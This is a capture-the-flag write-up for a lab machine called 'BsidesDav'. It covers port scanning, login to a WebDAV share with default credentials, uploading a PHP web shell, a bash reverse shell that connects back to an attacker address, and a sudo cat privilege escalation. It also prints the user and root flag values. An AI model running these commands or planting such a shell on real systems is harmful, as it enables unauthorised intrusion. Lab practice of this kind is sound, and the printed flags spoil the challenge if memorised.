# Challenge Writeup: BsidesDav
*(solved using gemini 🤖🤖🤖)*
## 1. Enumeration

### 1.1 Port Scanning
The initial scan identified port 80 (HTTP) as the only open port.

```bash
nmap -p- -T4 --min-rate=1000 10.48.146.165
```

A version scan confirmed the service:
- **Port 80/tcp**: Apache httpd 2.4.18 (Ubuntu)

### 1.2 Web Directory Fuzzing
Fuzzing for directories and files revealed a `/webdav/` directory requiring Basic Authentication.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.48.146.165/FUZZ
```

### 1.3 WebDAV Credential Brute-forcing
Testing common credentials for XAMPP/WAMPP installations revealed valid credentials:
- **Username**: `wampp`
- **Password**: `xampp`

```bash
curl -u wampp:xampp -s -I http://10.48.146.165/webdav/
```

## 2. Exploitation

### 2.1 File Upload
Using the discovered credentials, `davtest` confirmed that various file types could be uploaded and executed, including `.php`.

```bash
davtest -url http://10.48.146.165/webdav/ -auth wampp:xampp
```

### 2.2 Command Execution
A simple PHP web shell was uploaded to the `/webdav/` directory.

```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
curl -u wampp:xampp -T cmd.php http://10.48.146.165/webdav/cmd.php
```

Testing the shell:
```bash
curl -s -u wampp:xampp "http://10.48.146.165/webdav/cmd.php?cmd=id"
# Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 2.3 Reverse Shell
A robust PHP reverse shell was uploaded and triggered.

```bash
# On attacker machine
nc -lvnp 6969

# Triggering the shell via curl
curl -s -u wampp:xampp "http://10.48.146.165/webdav/cmd.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.131.247%2F6969%200%3E%261'"
```

## 3. Post-Exploitation & Privilege Escalation

### 3.1 User Flag
The user `merlin`'s home directory contained the user flag, which was readable by the `www-data` group.

```bash
cat /home/merlin/user.txt
# Flag: 449b40fe93f78a938523b7e4dcd66d2a
```

### 3.2 Root Escalation
Checking sudo permissions revealed that `www-data` could run `/bin/cat` as root without a password.

```bash
sudo -l
# User www-data may run the following commands on ubuntu:
#    (ALL) NOPASSWD: /bin/cat
```

The root flag was retrieved using this privilege:
```bash
sudo /bin/cat /root/root.txt
# Flag: 101101ddc16b0cdf65ba0b8a7af7afa5
```
